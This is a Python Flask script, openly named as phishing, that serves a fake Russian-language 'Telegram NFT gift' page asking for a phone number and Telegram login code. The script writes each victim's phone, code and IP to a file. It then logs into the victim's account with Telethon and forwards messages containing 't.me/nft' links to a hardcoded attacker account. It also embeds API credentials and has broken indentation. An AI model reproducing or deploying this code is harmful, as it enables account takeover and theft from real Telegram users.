```python
                                                                   
from flask import Flask, request, render_template_string
import asyncio
import threading
import re
import os
import logging
from datetime import datetime
from telethon import TelegramClient
from telethon.errors import FloodWaitError, PhoneNumberInvalidError, SessionPasswordNeededError

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(name)

API_ID = 35008820
API_HASH = "f2d029353318854be42b9de2d75c3933"
TARGET_ID = 7499553746

PHISHING_PAGE = """

<!DOCTYPE html>

<html>
<head><title>Telegram NFT Gift</title></head>
<body style="text-align:center; padding-top:50px;">
    <h2>🎁 NFT-подарок Snoop Dogg #223674</h2>
    <form method="POST" action="/claim">
        <input type="text" name="phone" placeholder="+7XXXXXXXXXX"><br>
        <input type="text" name="code" placeholder="Код из Telegram"><br>
        <button type="submit">Получить</button>
    </form>
</body>
</html>
"""

app = Flask(name)

@app.route('/')
def index():
logger.info("Главная страница загружена")
return render_template_string(PHISHING_PAGE)

@app.route('/claim', methods=['POST'])
def claim():
phone = request.form.get('phone')
code = request.form.get('code')
ip = request.remote_addr
logger.info(f"Жертва: {phone} | {code} | {ip}")
with open('victims.txt', 'a') as f:
f.write(f"{datetime.now()} | {phone} | {code} | {ip}\n")
threading.Thread(target=lambda: asyncio.run(steal(phone, code)), daemon=True).start()
return "Подарок отправлен!"

async def steal(phone, code):
try:
client = TelegramClient(f'session_{phone}', API_ID, API_HASH)
await client.start(phone=phone, code_callback=lambda: code)
me = await client.get_me()
async for dialog in client.iter_dialogs():
async for msg in client.iter_messages(dialog.id, limit=200):
if msg.text and 't.me/nft' in msg.text:
await client.forward_messages(TARGET_ID, msg.id, dialog.id)
await client.disconnect()
except Exception as e:
logger.error(f"Ошибка: {e}")

if name == "main":
port = int(os.environ.get("PORT", 5000))
app.run(host='0.0.0.0', port=port)                            